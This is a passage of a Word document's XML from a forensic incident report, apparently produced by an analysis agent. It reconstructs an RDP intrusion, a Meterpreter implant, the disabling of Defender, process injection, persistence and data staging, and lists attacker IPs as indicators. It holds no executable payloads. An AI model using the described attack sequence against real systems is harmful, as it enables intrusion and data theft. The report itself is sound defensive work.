        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 11: Defense evasion and anti-forensics</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Defense evasion and anti-forensics review.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Log clearing: none found.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No Security 1102, no System 104 and no 4719.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- EventRecordIDs have no gaps in Security (1–2457), System (1–994), both PowerShell channels and Defender/Operational.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The six Security 1100 events are normal shutdowns before the 01:24 boot.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Defender:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The attacker turned Defender off at 03:39:45–49 (5001, and 5007 for SpyNet 2→0, SubmitSamples 1→0, TamperProtection 0x1→0x4), as already reported in F-007.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- It stayed off until acquisition: DisableRealtimeMonitoring=1 is still in the hive, there is no re-enable event and no detection for coreupdater.exe or the PowerShell loader.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No exclusions were set (registry Exclusions keys and the MPLog lists are empty).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- I added the registry rows to F-007 as corroboration.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Timestomping: none on attacker files.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The SI&lt;FN and uSecZeros hits are files and folders laid down when the OS image was deployed.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- coreupdater.exe's $SI times match the $J timestamps.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Deletion and wiping:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No deletions in Prefetch, the event-log folder or the Recycle Bin, and no wiping tools on disk.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The only attacker deletions are the Edge partial and cache copies of coreupdater.exe and the loot.zip archive (already in F-026).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Clock changes: all 4616 and Kernel-General 1 events come from W32Time or the clock resync when the VM resumed at 03:13.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Memory:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No hidden processes (psxview), PEB spoofing or unlinked DLLs.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The injection findings stand (F-015 spoolsv, F-016 PowerShell). I added the RWX thread start in PowerShell PID 3316 to F-016.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The MsMpEng malfind hit and the non-file-backed thread starts are false positives.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Recorded: F-030 (overall assessment), T-024, and a note listing the false positives.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: - raw.dissect_defender_exclusions is absent from the case; I checked exclusions through the registry and MPLog instead.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- $UsnJrnl only starts at 2020-09-19 01:31:32, so earlier deletions can't be seen.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- There is no Sysmon and 4688 is only logged at boot, so command-level evasion such as Set-MpPreference or wevtutil can't be fully excluded. The Defender changes do line up with SecHealthUI GUI use.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- How to read the TamperProtection value 0x4 depends on the platform version, so that point is only probable.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- raw.vol_etwpatch is not available, so ETW patching was not checked.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 12: Collection, exfiltration and communications</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Collection and exfiltration review:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Confirmed staging: Explorer zip "My Social Security Number.zip" was created at 03:46:15, renamed loot.zip at 03:46:18, opened (ObjectId change + loot.lnk) and deleted at 03:47:09. The source files are tiny (22, 141 and 7 bytes), so the archive was at most a few hundred bytes.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No archiver or transfer tools ran (Prefetch) and no other archives were created.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- BITS was used only by OneDrive. OneDrive was never signed in (ODL).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No HTTP uploads to attacker or non-Microsoft hosts, no DNS tunnelling, no SMB writes, no attacker firewall rules (only 2004/2006 AppX rules) and no removable media.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Network volumes (SRUM + pcap):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - coreupdater.exe sent 222 KB + 27 KB.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Meterpreter C2 flow 50875 sent 280 KB up; flow 50972 sent 39 KB.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - The RDP stream sent 6.7 MB from the workstation to the DC, matching SRUM TermService at 7.1 MB.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- F-031 (high/probable): exfiltration of the small archive most likely went over the encrypted Meterpreter C2. The RDP clipboard is an alternative. Neither can be proven at content level.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Timeline T-025 and a note were recorded. No new network IOCs beyond the existing 194.61.24.102 and 203.78.103.109.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: - The C2 (TLS/Meterpreter) and RDP payloads are encrypted, so there is no content-level proof of what was sent.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The OneDrive SyncEngineDatabase.db was not parsed (moot, since the client was never signed in).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No Sysmon 3/22 or 5156 network telemetry.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- No dissect_sevenzip output.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The loot.zip size was not recovered: its MFT entry was reused and no $LogFile I30 record exists.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 13: Incident timeline and correlation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>I rebuilt the incident timeline and checked that the different sources agree on time. Times are UTC; the host is on Pacific time (UTC-7).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Attack sequence**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>1. **Reconnaissance and brute force (03:19, host-equivalent time):** 194.61.24.102 ran an RDP scan and brute force against the Administrator account on the DC (10.42.85.10).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>2. **DC compromised (03:24):** the DC downloaded coreupdater.exe and opened a Meterpreter session.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>3. **Initial access to the workstation (03:36:22–24):** RDP logon by C137\Administrator (SID -500) coming from the DC.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>4. **Defender disabled (03:39:45–49).**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>5. **Payload download:**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">   - 03:39:26: Edge goes to http://194.61.24.102/ (new T-026).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">   - 03:39:57 → 03:40:00: download and Save-As into Downloads.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">   - 03:40:42: file moved to System32.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>6. **Execution (03:40:49):** coreupdater.exe runs, its Mark-of-the-Web is removed, and the C2 connection to 203.78.103.109:443 starts.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>7. **Interactive commands:** cmd at 03:41:06, then sc.exe and service "coreupdater" at 03:42:42.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>8. **Migration into spoolsv.exe (between 03:40:49 and 03:43:10):** coreupdater (PID 8324) exits at 03:43:10. Memory shows an injected PE (MZ, RWX) in spoolsv.exe PID 2188, which holds the C2 socket and a handle to lsass (new T-027).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>9. **Privilege escalation (03:43:14):** getsystem service "nehgye".</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>10. **Fileless persistence (03:44:03):** HKLM Run value "coreupdate" plus payload key HKLM\Software\q9Z1bssi.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>11. **Collection and staging (03:45:07–03:51:14):** the attacker browsed user profiles and built the loot.zip archive (03:46:15–03:47:09).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>12. **Logoff (03:52:13).**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>13. **Persistence fires (05:08:15–05:08:45):** ricksanchez logs on (type 11/7, new T-028), the Run key launches the PowerShell loader (PID 508→3316) and a second C2 session opens.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>14. **Responder acquisition from 05:08:58.** The C2 connections were still established when the capture ended at 05:38 (host time).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Time consistency (F-032)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The host sources agree to the second: EVTX, $MFT, $J, Prefetch, SRUM and memory.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The only clock jump is a VM pause and resume: the clock went from 01:54:39 to 03:13:20 (Kernel-General 1) and was then adjusted slightly by W32Time. There was no backward change during the attack.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The pcap timestamps carry a +0200 offset, and the capture clock runs 1 h behind the host. This was confirmed on three pivots, so every pcap time in the timeline table must be read +1 h.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No timestomping was found.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**New IOCs (I-016..I-020)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- the PowerShell loader command line;</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- the HKLM\Software\q9Z1bssi key;</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- the Edge partial and cache files;</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 10.42.85.10 as an internal pivot host;</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- the injected region in spoolsv.exe.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>All earlier IOCs are kept (hashes, IPs, URLs, Run value, services, account, archives).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: - The exact time of the migration into spoolsv.exe is not logged; only the 03:40:49–03:43:10 bounds are known.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- What was done in the C2 sessions (including any exfiltration of loot.zip) cannot be seen because the traffic is encrypted.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- There is no process-creation telemetry (no Sysmon, 4688 only at boot), so the commands run inside Meterpreter are unknown.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- How the DC was compromised can only be inferred from the pcap; no disk or log evidence from the DC is available.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 14: Summary, answers and recommendations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The report summary is done.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Verdict:** the host is compromised. An attacker at 194.61.24.102 brute-forced the domain controller (CITADEL-DC01, 10.42.85.10), then logged on to the workstation over RDP as C137\Administrator at 03:36:24.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Payload:** coreupdater.exe, a Meterpreter implant calling back to 203.78.103.109:443.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Attacker actions:**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Defender turned off.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Implant moved into spoolsv.exe, then getsystem.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Two persistence mechanisms: the Run key "coreupdate" (fileless, fired at 05:08 in ricksanchez's Domain Admin context) and the service "coreupdater".</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - mortysmith's sensitive files collected, zipped as loot.zip and deleted.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Exfiltration:** probable, most likely through the C2 channel.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>The executive summary, technical summary and limitations are recorded. Recommendations are recorded in all five categories: immediate, remediation, hardening, detection and further investigation. The guidance file had no questions, so no answer_question entries were made.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: - No Sysmon or full 4688 data, so the full command lines are unknown.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Browser databases were not parsed.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The memory step stopped early because it hit the tool-call limit.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- Because the C2 traffic is encrypted, data theft and credential theft cannot be proven at content level.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The DC was not collected.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Appendix B: Automatic detections</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2268"/>
        <w:gridCol w:w="2268"/>
        <w:gridCol w:w="1701"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Engine</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Level</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Count</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>informational</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>85</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>20</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>4</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>high</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>informational</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>1098</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Hayabusa</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
